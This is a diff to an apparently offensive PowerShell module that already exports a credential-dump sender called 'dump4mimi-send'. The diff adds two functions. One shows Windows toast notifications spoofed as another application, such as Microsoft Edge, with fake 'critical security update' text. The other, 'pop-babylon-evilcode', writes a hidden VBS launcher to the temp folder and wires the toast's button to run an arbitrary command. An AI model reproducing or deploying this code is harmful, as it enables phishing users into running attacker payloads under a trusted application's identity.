@@ -583,3 +583,105 @@ Remove-Item -Path $d4mPath -Force -ErrorAction SilentlyContinue
 Export-ModuleMember -Function dump4mimi-send
 Set-Alias -Name dump4mimi-send -Value dump4mimi-send
 
+# (Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\).PSChildName
+# pop-babylon -over "MSedge" -text "MSedge requires a critical security update" -text2 "Internet access is degraded" -btntext "Dismiss"
+function pop-babylon {
+    param (
+        [string]$over,		
+        [string]$text, 
+        [string]$text2,
+		[string]$btntext
+
+    )    
+    add-type -AssemblyName System.Runtime.WindowsRuntime
+    [Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
+    [Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
+
+    $vbsContent = @"
+CreateObject("WScript.Shell").Run "$command", 0, False
+"@
+    $vbsPath = "$env:TEMP\_update.vbs"
+    Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII
+    
+    $timeoutScript = {
+        Start-Sleep -Seconds 8
+        if (Test-Path $using:vbsPath) {
+            Remove-Item $using:vbsPath -Force -ErrorAction SilentlyContinue
+        }
+    }
+    $timeoutJob = Start-Job -ScriptBlock $timeoutScript   
+    $AUMID = "$over"
+    $xml = @"
+<toast>
+  <visual>
+    <binding template="ToastGeneric">
+      <text>$text</text>
+      <text>$text2</text>
+    </binding>
+  </visual>
+    <actions>
+   <action content="$btntext" activationType="Protocol" arguments="" />
+  </actions>
+</toast>
+"@
+    
+    $doc = New-Object Windows.Data.Xml.Dom.XmlDocument
+    $doc.LoadXml($xml)
+    $toast = [Windows.UI.Notifications.ToastNotification]::new($doc)
+    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
+    $notifier.Show($toast)
+}
+Export-ModuleMember -Function pop-babylon
+Set-Alias -Name pop-babylon -Value pop-babylon
+
+# (Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\).PSChildName
+# pop-babylon-evilcode -command "calc.exe" -over "MSedge" -text "Hlavní text" -text2 "spodni text" -btntext "Install Update"
+function pop-babylon-evilcode {
+    param (
+        [string]$command, 
+        [string]$over,		
+        [string]$text, 
+        [string]$text2,
+		[string]$btntext
+    )
+    
+    add-type -AssemblyName System.Runtime.WindowsRuntime
+    [Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
+    [Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]
+
+    $vbsContent = @"
+CreateObject("WScript.Shell").Run "$command", 0, False
+"@
+    $vbsPath = "$env:TEMP\_update.vbs"
+    Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII    
+    $timeoutScript = {
+        Start-Sleep -Seconds 8
+        if (Test-Path $using:vbsPath) {
+            Remove-Item $using:vbsPath -Force -ErrorAction SilentlyContinue
+        }
+    }
+    $timeoutJob = Start-Job -ScriptBlock $timeoutScript   
+    $AUMID = "$over"
+    $xml = @"
+<toast>
+  <visual>
+    <binding template="ToastGeneric">
+      <text>$text</text>
+      <text>$text2</text>
+    </binding>
+  </visual>
+  <actions>
+    <action content="$btntext" activationType="Protocol" arguments="file:///$vbsPath" />
+  </actions>
+</toast>
+"@
+    
+    $doc = New-Object Windows.Data.Xml.Dom.XmlDocument
+    $doc.LoadXml($xml)
+    $toast = [Windows.UI.Notifications.ToastNotification]::new($doc)
+    $notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
+    $notifier.Show($toast)
+}
+Export-ModuleMember -Function pop-babylon-evilcode
+Set-Alias -Name pop-babylon-evilcode -Value pop-babylon-evilcode
+
